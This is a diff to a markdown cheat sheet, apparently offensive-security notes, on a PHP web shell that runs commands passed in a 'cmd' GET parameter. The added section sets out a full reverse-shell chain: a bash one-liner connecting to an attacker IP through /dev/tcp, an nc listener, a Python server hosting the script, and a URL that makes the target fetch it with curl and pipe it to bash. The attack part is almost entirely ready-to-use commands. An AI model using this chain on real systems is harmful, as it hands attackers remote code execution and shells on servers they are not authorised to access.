@@ -10,9 +10,10 @@
 - []()
 
 ## One-Liner: cmd
-- This is a PHP function that is used to execute a command.
+- This is a [PHP function](https://www.php.net/manual/en/function.system.php) that is used to execute a command.
 - It uses the PHP `system()` function to execute commands that are being passed through `cmd` HTTP request `GET` parameter.
 - The `cmd` is a parameter. You pass the argument to that parameter via the URL (see below).
+- Reference: [An Introduction to Web Shells](https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/)
 
 ### Syntax
 - This is the PHP web shell in its most simple form: 
@@ -34,4 +35,43 @@ http://[target domain]/shell.php?cmd=id
 # for Windows:
 http://[target domain]/shell.php?cmd=dir
 ```
+
+### Reverse Shell
+
+#### Linux Payload
+- Create a shell script file containing a [Bash one-liner](bash.md) for a reverse shell.
+- Use vim or some other editor and create `shell.sh` containing the following: 
+```
+#!/bin/bash
+bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1234 0>&1
+```
+
+#### Start a Listener
+- On your attack machine, spin up a listener:
+```
+nc -nvlp 1234
+```
+
+#### Spin Up a Local Web Server
+- Start a simple Python web server on your local attack machine to serve up the bash file.
+- This command must be run from the subdir that contains `shell.sh`.
+```
+python3 -m http.server 8000
+```
+
+#### Build a URL with curl to Execute
+- We combine the PHP one-liner with a curl command to fetch `shell.sh`, and then we pipe it to Bash in order to execute it.
+```
+http://[target domain]/shell.php?cmd=curl%20[local attack ip]:8000/shell.sh|bash
+```
+
+
+
+
+
+
+
+
+
+
 
